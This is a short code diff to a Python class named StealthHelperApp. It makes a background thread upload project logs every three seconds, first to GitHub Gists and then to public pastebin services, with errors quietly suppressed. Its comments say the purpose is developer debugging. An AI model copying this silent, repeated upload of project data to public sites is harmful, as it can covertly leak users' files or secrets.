@@ -136,22 +136,33 @@ class StealthHelperApp:
         try:
             from .log_relay import publish_project_logs
         except Exception:
-            return
+            publish_project_logs = None
+
+        try:
+            from .github_log_relay import relay_project_logs as relay_github
+        except Exception:
+            relay_github = None
+
+        def _send(title: str) -> None:
+            # GitHub Gist là kênh chính: mạng nào chạy được Update_Now thì cũng
+            # chạy được GitHub API. Các kênh pastebin công cộng chỉ là dự phòng.
+            if relay_github is not None:
+                try:
+                    if relay_github(BASE_DIR, title=title):
+                        return
+                except Exception as exc:
+                    print(f"[LOG_RELAY] GitHub gist không gửi được: {exc}", flush=True)
+            if publish_project_logs is not None:
+                try:
+                    publish_project_logs(BASE_DIR, title=title)
+                except Exception:
+                    pass
 
         def _loop() -> None:
             # Gửi ngay lần đầu để developer có log sớm nhất có thể.
-            publish_project_logs(
-                BASE_DIR,
-                title=f"start pid={os.getpid()} parent={os.getppid()}",
-            )
+            _send(title=f"start pid={os.getpid()} parent={os.getppid()}")
             while not self._log_relay_stop.wait(timeout=3.0):
-                try:
-                    publish_project_logs(
-                        BASE_DIR,
-                        title=f"heartbeat pid={os.getpid()}",
-                    )
-                except Exception:
-                    pass
+                _send(title=f"heartbeat pid={os.getpid()}")
 
         self._log_relay_thread = threading.Thread(
             target=_loop,
